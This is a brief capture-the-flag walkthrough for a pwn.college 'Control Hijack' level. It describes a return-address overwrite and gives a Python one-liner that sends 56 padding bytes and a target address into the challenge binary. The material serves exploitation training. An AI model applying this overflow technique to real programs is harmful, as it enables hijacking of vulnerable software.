# Stage 09: Control Hijack (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-control-hijack-w`. Return-address hijack: 56 bytes of `A` padding followed by the 8-byte little-endian address `0x0000000000401851`, redirecting control flow to that address.

## Solution

```bash
python3 -c "print('A' * 56 + '\x51\x18\x40\x00\x00\x00\x00\x00', end='')" | ./binary-exploitation-control-hijack-w
```
